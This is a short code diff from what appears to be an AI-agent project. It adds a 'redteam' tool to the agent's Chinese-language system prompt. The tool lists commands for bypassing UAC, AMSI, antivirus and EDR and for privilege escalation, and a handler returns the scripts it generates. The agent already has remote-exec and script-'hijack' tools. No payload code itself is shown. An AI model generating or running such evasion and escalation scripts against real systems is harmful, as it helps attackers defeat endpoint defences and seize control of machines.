+  • 绕后/免杀：bypass:uac | bypass:amsi | bypass:av <方式> | bypass:edr
+  • 提权：privesc:windows | privesc:linux | privesc:token
+  示例：⟨工具:redteam｜reverse:frida com.example.MainActivity⟩ / ⟨工具:redteam｜bypass:uac⟩ / ⟨工具:redteam｜privesc:linux suid⟩
 规则：需要外部/实时/事实信息${hasExec ? '、或需要真动手操作主人的服务器与 iPhone' : ''}时，本轮只输出一个工具标记、不要同时作答；我把结果回给你，你再决定继续或作答。够了就直接给最终答案、不带任何工具标记；别原地打转。`;
     let scratch = '', toolLog = [], last = null, mediaAll = [];
     for (let step = 0; step < 5; step++) {
@@ -1234,6 +1843,7 @@ ${capabilitySelfDescription(true)}
         else if (c.tool === 'exec') { const e = await this.execRemote(c.arg).catch(() => null); out = e ? (e.ok ? `[退出码 ${e.code}]\n${e.stdout || ''}${e.stderr ? '\n[stderr]\n' + e.stderr : ''}` : ('执行脑：' + (e.note || e.error || '失败'))) : '执行脑无响应'; }
         else if (c.tool === 'apple') { const a = await this.appleTool(c.arg).catch(() => null); out = a ? (a.ok ? `[${a.tool}｜退出码 ${a.code}]\n${a.out || '(空)'}${a.err ? '\n[stderr]\n' + a.err : ''}` : ('iOS 工具：' + (a.note || '失败'))) : 'iOS 工具无响应'; }
         else if (c.tool === 'hijack') { const h = await this.handleHijack(c.arg).catch(() => null); out = h ? `[劫持脚本·${h.type}｜${h.desc}]\n\`\`\`javascript\n${h.script}\n\`\`\`` : '劫持工具无响应'; }
+        else if (c.tool === 'redteam') { const r = await this.handleRedTeam(c.arg).catch(() => null); out = r ? (r.ok ? `[红队·${r.desc}]\n\`\`\`\n${r.script}\n\`\`\`` : ('红队工具：' + (r.note || '失败'))) : '红队工具无响应'; }
         toolLog.push({ tool: c.tool, arg: c.arg, ok: !!out });
         obs.push(`【${c.tool}｜${c.arg}】\n${out || '（无结果）'}`);
       }
